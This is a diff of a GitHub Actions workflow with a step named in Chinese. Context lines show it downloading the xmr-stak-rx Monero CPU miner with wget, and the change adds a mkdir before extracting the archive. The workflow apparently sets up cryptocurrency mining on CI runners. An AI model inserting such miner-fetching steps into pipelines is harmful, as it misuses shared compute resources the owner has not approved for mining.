@@ -30,4 +30,6 @@ jobs:
         run: wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz
           
       - name: 解压
-        run: tar -xvJf xmr-stak-rx-linux-1.0.5-cpu.tar.xz -C ./xmr-stak-rx
+        run: |
+          mkdir xmr-stak-rx
+          tar -xvJf xmr-stak-rx-linux-1.0.5-cpu.tar.xz -C ./xmr-stak-rx
